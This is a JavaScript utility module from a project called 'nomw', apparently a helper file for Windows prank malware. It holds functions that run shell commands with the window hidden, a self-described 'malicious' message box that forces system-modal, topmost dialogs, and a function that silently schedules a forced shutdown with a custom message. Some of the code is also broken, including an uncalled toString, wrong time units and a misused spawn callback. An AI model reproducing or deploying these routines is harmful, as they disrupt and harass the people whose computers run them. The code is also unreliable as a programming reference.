/**
 * nomw
 * 
 * File...................Utils.js
 * Created on.............Sunday, 31st December 2017 3:48:59 am
 * Created by.............Relative
 * 
 */
const { spawn } = require('child_process')
const os = require('os')
const logger = require('./Logger')
const ms = require('ms')
let ffi
const Flags = require('./winapi/flags')
const User32 = require('./winapi/user32')

/**
 * @type {User32}
 */
let user32
global.ffiInstalled = false
try {
  ffi = require('ffi')
  user32 = require('./winapi').User32
  global.ffiInstalled = true
} catch(err) {
  if (os.platform() === 'win32') {
    global.ffiInstalled = false
    logger.error('FFI isn\'t installed and a lot of functionality will be missing!')
  }
}
class Utils {
  constructor() {
    /**
     * Is FFI installed to the environment?
     * @type {Boolean}
     */
    this.ffiInstalled = global.ffiInstalled
  }
  /**
   * Make a date (for use with Payloads, specifically)
   * @param {Number} month - The number of the month (starting with 1, not 0!!)
   * @param {Number} day - The day of the month to set the date to
   * @returns {Date}
   */
  makeDate(month, day) {
    const date = new Date()
    date.setMonth(month - 1, day)
    return date
  }

  exec(command) {
    spawn(command, {
      windowsHide: true
    }, (err, stdout, stderr) => {
      if (err) return logger.error(`Failed to execute "${command}"`, err)
      stdout.on('data', (data) => logger.info(data.toString()))
      stderr.on('data', (data) => logger.error(data.toString()))
    })
  }

  /**
   * Convert a string to a format
   * @param {String} string - String to convert
   * @param {String} [to='binary'] - What format to convert to
   */
  convert(string, to = 'binary') {
    return Buffer.from(string).toString(to)
  }

  /**
   * @typedef {Object} MessageBoxOptions
   * @prop {Boolean} [service=false] - Service notification
   * @prop {Boolean} [foreground=false] - Set foreground
   * @prop {Boolean} [topMost=false] - Set topmost
   * @prop {Boolean} [systemModal=false] - Set system modal
   * @prop {Number} [flags=0] - Flags to apply settings to
   */
  
  /**
   * Display a message box on windows using FFI
   * @param {String} message - Message to display
   * @param {String} caption - Message box title
   * @param {MessageBoxOptions} options - Message box options
   * @returns {Promise<Number>}
   */
  messageBox(message, caption, options) {
    if (os.platform() !== 'win32' || !this.ffiInstalled) return
    options = Object.assign({
      service: false,
      foreground: false,
      topMost: false,
      systemModal: false,
      flags: 0
    }, options)
    options.flags = Flags.combine(
      options.flags, 
      options.service ? Flags.MB_SERVICE_NOTIFICATION : 0, 
      options.foreground ? Flags.MB_SETFOREGROUND : 0,
      options.topMost ? Flags.MB_TOPMOST : 0,
      options.systemModal ? Flags.MB_SYSTEMMODAL : 0)
    return user32.MessageBoxA(0, message, caption, options.flags)
  }
/**
   * Display a message box on windows using FFI, but maliciously with every options enabled
   * @param {String} message - Message to display
   * @param {String} caption - Message box title
   * @param {MessageBoxOptions} options - Message box options
   * @returns {Promise<Number>}
   */
  maliciousMessageBox(message, caption, options) {
    if (os.platform() !== 'win32' || !this.ffiInstalled) return
    options = Object.assign({
      service: true,
      foreground: true,
      topMost: true,
      systemModal: true,
      flags: 0
    }, options)
    return this.messageBox(message, caption, options)
  }

  /**
   * Shutdown computer
   * @param {String} message - Shutdown message
   * @param {String} [time="20s"] - Time until shutdown (in zeit/ms compatible time, defaults to seconds if no unit, or just a number)
   */
  shutdown(message, time = '20s') {
    if (os.platform() !== 'win32') return
    if (typeof time === 'number') time = `${time.toString}s`
    time = ms(time) * 1000

    this.exec(`shutdown /s /t ${time} /c \"${message}\"`)
  }
}
module.exports = new Utils()
